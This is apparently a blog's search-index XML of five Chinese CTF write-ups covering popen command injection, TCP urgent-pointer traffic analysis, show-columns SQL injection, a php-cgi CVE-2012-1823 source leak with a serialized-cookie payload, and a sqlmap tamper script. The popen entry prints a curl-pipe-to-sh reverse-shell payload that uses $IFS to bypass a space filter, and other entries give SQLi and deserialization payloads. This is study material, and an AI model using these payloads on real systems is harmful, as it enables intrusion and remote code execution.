<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>单popen函数getshell</title>
      <link href="/Writeup/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/"/>
      <url>/Writeup/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="单popen函数getshell"><a href="#单popen函数getshell" class="headerlink" title="单popen函数getshell"></a>单popen函数getshell</h1><p>　　<strong>知识点：代码审计、popen函数、反弹shell</strong></p><p>　　‍</p><p>　　审计源码，popen后没有输出，无法直接看到输入命令的回显，那么我们可以利用反弹shell来直接rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#Try to read /flag</span></span><br><span class="line"><span class="keyword">if</span>(!isset($_GET[<span class="string">&#x27;command&#x27;</span>])&amp;!isset($_GET[<span class="string">&#x27;parameter&#x27;</span>])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$command = $_GET[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">$parameter = $_GET[<span class="string">&#x27;parameter&#x27;</span>];</span><br><span class="line"></span><br><span class="line">function <span class="built_in">filter</span>($data) &#123;</span><br><span class="line">    $black_list = array(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>,<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    foreach ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        $data = str_replace($key, <span class="string">&#x27;&#x27;</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$command = <span class="built_in">filter</span>($command);</span><br><span class="line">popen(<span class="string">&quot;$command&quot;</span>,$parameter);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>　　这里利用ctfshow中师傅给的一键反弹shell的方法</p><p>　　<img src="/Writeup/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/image-20230110213117-otjm4zz.png" class title="image">​</p><p>　　接着绕过空格过滤就好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过空格反弹shell</span><br><span class="line">?command=curl$IFS$<span class="number">9</span>https:<span class="comment">//your-shell.com/106.53.106.224:1337$IFS$9|sh&amp;parameter=r</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> popen函数 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP-urgent-pointer</title>
      <link href="/Writeup/MISC/TCP-urgent-pointer/"/>
      <url>/Writeup/MISC/TCP-urgent-pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-urgent-pointer"><a href="#TCP-urgent-pointer" class="headerlink" title="TCP-urgent-pointer"></a>TCP-urgent-pointer</h1><p>　　<strong>知识点：流量分析、urgent-pointer、脚本编写</strong></p><p>　　‍</p><p>　　首先分析流量，发现upload了一张图片，猜测有关键信息</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230108220119-fn0x4aa.png" class title="image"></p><p>　　‍</p><p>　　发现上传了一张图片，将它导出</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230108220216-etjkc21.png" class title="image"></p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230108220302-h67sn7h.png" class title="image"></p><p>　　‍</p><p>　　得到图片，提示urg</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230108220316-295m7jj.png" class title="image"></p><p>　　参考<a href="https://writeup.ctfhub.com/Challenge/2019/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%88%90%E9%83%BD%E7%AB%99/v1v1LKxrfTfJNn1CaRtkhE.html">https://writeup.ctfhub.com/Challenge/2019/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%88%90%E9%83%BD%E7%AB%99/v1v1LKxrfTfJNn1CaRtkhE.html</a></p><p>　　‍</p><p>　　根据提示观察流量包的urgent-pointer</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230110205344-ujgbhol.png" class title="image"></p><p>　　​</p><p>　　用tshark命令将urgent-pointer的非0值全部导出，并将换行符替换为空格</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230108220429-nwj9po7.png" class title="image"></p><p>　　‍</p><p>　　基本上每组都是五位数，猜测是十进制数转十六进制，十六进制再转ascii字符</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110205529-qd40jod.png" alt="image"><img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110210021-n4hwn58.png" alt="image"></p><p>　　得到lf，反过来就说flag的前两个字符，根据这个规则编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [<span class="number">27750</span>, <span class="number">26465</span>, <span class="number">24955</span>, <span class="number">13113</span>, <span class="number">14393</span>, <span class="number">25907</span>, <span class="number">25910</span>, <span class="number">25905</span>, <span class="number">14647</span>, <span class="number">25701</span>, <span class="number">13622</span>, <span class="number">12644</span>, <span class="number">12848</span>, <span class="number">14178</span>, <span class="number">12599</span>, <span class="number">13411</span>, <span class="number">14642</span>, <span class="number">12387</span>, <span class="number">32054</span>, <span class="number">56125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(i))[<span class="number">2</span>:-<span class="number">1</span>][::-<span class="number">1</span>],<span class="string">&quot;(&quot;</span>,long_to_bytes(i),<span class="string">&quot;)&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/MISC/TCP-urgent-pointer/image-20230110210211-7bb8x83.png" class title="image">​</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> urgent-pointer </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show columns 注入</title>
      <link href="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/"/>
      <url>/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="show-columns-注入"><a href="#show-columns-注入" class="headerlink" title="show columns 注入"></a>show columns 注入</h1><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><p>　　<strong>sql注入漏洞</strong></p><p>　　‍</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_info</span>(<span class="params"><span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$dosql</span>;</span><br><span class="line"><span class="comment">//关闭安全检查</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cfg_diserror</span>;</span><br><span class="line"><span class="variable">$cfg_diserror</span> = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line"><span class="variable">$dosql</span>-&gt;safecheck = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;show columns from `article_<span class="subst">&#123;$table&#125;</span>`&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;show coulumns 出错:&quot;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `article_<span class="subst">&#123;$table&#125;</span>` and 1=1&quot;</span>;<span class="comment"># where 1=1&quot;;</span></span><br><span class="line"><span class="comment">//echo $sql;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$attr</span>=<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;<span class="subst">$sql</span>&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mysql_error</span>();</span><br><span class="line"><span class="keyword">return</span> $`attr`;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="show-columns语法"><a href="#show-columns语法" class="headerlink" title="show columns语法"></a>show columns语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] &#123;COLUMNS | FIELDS&#125;</span><br><span class="line">    &#123;FROM | IN&#125; tbl_name</span><br><span class="line">    [&#123;FROM | IN&#125; db_name]</span><br><span class="line">    [LIKE &#x27;pattern&#x27; | WHERE expr]</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>　　有回显的话利用报错注入，没有回显的时候可以用时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=test` where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/WEB/show-columns-%E6%B3%A8%E5%85%A5/image-20230109005333-rj6pl0h.png" class title="image">​</p><p>　　<img src="/Writeup/WEB/show-columns-%E6%B3%A8%E5%85%A5/WEB/show-columns-%E6%B3%A8%E5%85%A5/image-20230109005411-x35ld63.png" class title="image"></p><p>　　将其标记为注入点给sqlmap爆破</p><p>　　![image](show columns 注入&#x2F;image-20230109005451-j2zdou0.png)![image](show columns 注入&#x2F;image-20230109005501-r9trzox.png)​</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php-cgi之获取源码</title>
      <link href="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/"/>
      <url>/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="php-cgi之获取源码"><a href="#php-cgi之获取源码" class="headerlink" title="php-cgi之获取源码"></a>php-cgi之获取源码</h1><p>　　<strong>知识点：信息泄露、cve-2012-1823，代码审计</strong></p><p>　　‍</p><p>　　右键源代码</p><img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213556-7vaqw5a.png" class title="image">​<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213700-soj7wti.png" class title="image">​<p>　　<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213707-mxw1q48.png" class title="image"></p><p>　　‍</p><p>　　发现在main.php下的提示</p><p>　　<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110213732-8pgsog7.png" class title="image"></p><p>　　关于cve-2012-1823，我们参考<a href="https://www.freebuf.com/articles/web/213647.html">https://www.freebuf.com/articles/web/213647.html</a></p><p>　　<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110214051-kxmt684.png" class title="image"></p><p>　　‍</p><p>　　可知通过-s可以获取源码<img src="/Writeup/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/WEB/php-cgi%E4%B9%8B%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/image-20230110214341-zooynws.png" class title="image"></p><p>　　尝试了上述文章中的其他利用方式无法成功，那么利用点就是在泄露的源码内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(<span class="string">&#x27;install.file.lock&#x27;</span>)) &#123;</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_GET</span>) || !empty(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;&#123;<span class="variable">$parts</span>[&#x27;host&#x27;]&#125;:&#123;<span class="variable">$parts</span>[&#x27;port&#x27;]&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (empty(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>]) &amp;&amp; !empty(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$key</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line"><span class="keyword">function</span> get_contents(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="variable">$key</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$key</span>[<span class="string">&#x27;main&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>　　审计源码，发现只需要令REFERER和host相同即可进入下面的判断，那么接下来我们只需要构造一串序列化，令func&#x3D;get_contents，main&#x3D;key.php</p><p>　　即可令程序执行call_user_func(“get_contents”,”key.php”);  从而获取到key</p><p>　　下面就是构造出的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">&quot;func&quot;</span>;s:12:<span class="string">&quot;get_contents&quot;</span>;s:4:<span class="string">&quot;main&quot;</span>;s:7:<span class="string">&quot;key.php&quot;</span>;&#125;</span><br><span class="line">YToyOntzOjQ6ImZ1bmMiO3M6MTI6ImdldF9jb250ZW50cyI7czo0OiJtYWluIjtzOjc6ImtleS5waHAiO30=</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> cve-2012-1823 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入之编写sqlmap-tamper脚本实现绕过</title>
      <link href="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/"/>
      <url>/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入之编写sqlmap-tamper脚本实现绕过"><a href="#sql注入之编写sqlmap-tamper脚本实现绕过" class="headerlink" title="sql注入之编写sqlmap-tamper脚本实现绕过"></a>sql注入之编写sqlmap-tamper脚本实现绕过</h1><p>　　<strong>知识点：sql注入漏洞，脚本编写</strong></p><p>　　‍</p><p>　　根据题目提示已知是sql注入，一开始用单引号什么的测试发现不太对劲，后来发现输入的字符与报错返回的字符不一样，右键查看一下源代码，发现输入code的字符会经过这个validate函数</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134533-rx6bbfa.png" class title="image">​</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134322-5xtywse.png" alt="image"><img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134403-nrweirs.png" alt="image">​</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134350-z1or6ui.png" class title="image"></p><p>　　然后根据题目的混淆函数，</p><p>　　编写sqlmap tamper脚本，然后交给sqlmap跑就ok了（懒狗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"> </span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="comment"># Initialize an empty string to store the result</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment"># Iterate through each character in the string</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="comment"># Shift the ASCII value of the character by -1</span></span><br><span class="line">            c_shifted = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># Append the shifted character to the result</span></span><br><span class="line">            result += c_shifted</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110140915-o6yy5j9.png" class title="image">​</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110140927-o0kuzdh.png" class title="image">​</p><p>　　‍</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本编写 </tag>
            
            <tag> sql注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
